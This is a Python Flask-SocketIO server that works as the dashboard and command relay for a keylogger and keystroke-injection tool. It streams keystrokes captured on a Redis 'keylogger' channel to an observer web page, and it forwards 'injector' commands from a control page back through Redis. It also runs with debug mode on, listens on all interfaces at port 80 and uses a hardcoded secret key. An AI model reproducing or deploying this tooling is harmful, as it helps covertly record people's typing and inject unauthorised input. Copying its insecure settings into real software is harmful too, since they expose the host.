import eventlet
eventlet.monkey_patch()  # Patch standard library to cooperate with eventlet greenlets

from flask import Flask, render_template
from flask_socketio import SocketIO
import redis
import json
import threading
from Logger.utils.getIP import getIP

# Initialize the Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'  # Configure a secret key for session management
socketio = SocketIO(app)  # Initialize SocketIO with the Flask app

# Setup the Redis client connect to Redis server
redis_client = redis.StrictRedis(host='localhost', port=6379, db=0)

# Define route for the main observer (monitoring) page
@app.route("/")
def observer():
    return render_template("observer.html", ip=getIP()) # Render the observer.html page and pass the local IP address to it

# Define route for the control (injection) page
@app.route("/control")
def feeder():
    return render_template("feeder.html", ip=getIP()) # Render the feeder.html page and pass the local IP address to it

# Listen for 'injector' events on the websocket and funnel them to Redis
@socketio.on('injector')
def injector(message):
    data = message['data'] # distract the data from Client
    print("RECV from Client:", data)
    channel = 'injector'  # Define the channel to use for publishing
    json_data = json.dumps(data)  # Convert data to JSON string
    redis_client.publish(channel, json_data)  # Publish the data to the Injector channel on Redis

# Set up a separate thread to listen for keylogger events from Redis
def keylogger_listener():
    def redis_callback():
        # Define the callback function for subscription to Redis
        channel = 'keylogger'
        pubsub = redis_client.pubsub()  # Create a Redis pub/sub
        pubsub.subscribe(channel)  # Subscribe to the Keylogger channel
        for message in pubsub.listen():
            # Loop over messages received on the channel
            if message['type'] == 'message':
                data = json.loads(message['data'].decode('utf-8'))
                print("RECV from KeyLogger:", data)
                socketio.emit(channel, {'data': data}) # Emit the received data using the SocketIO server

    redis_thread = threading.Thread(target=redis_callback)  # Create a thread with the Redis callback
    redis_thread.start()  # Start the Redis listening thread

# Start the Flask socketio server with a call to 'start'
def start():
    keylogger_listener()  # Initialize the Redis listener thread
    socketio.run(app, host='0.0.0.0', port='80', debug=True)  # Start the Flask app with SocketIO support

if __name__ == '__main__':
    start()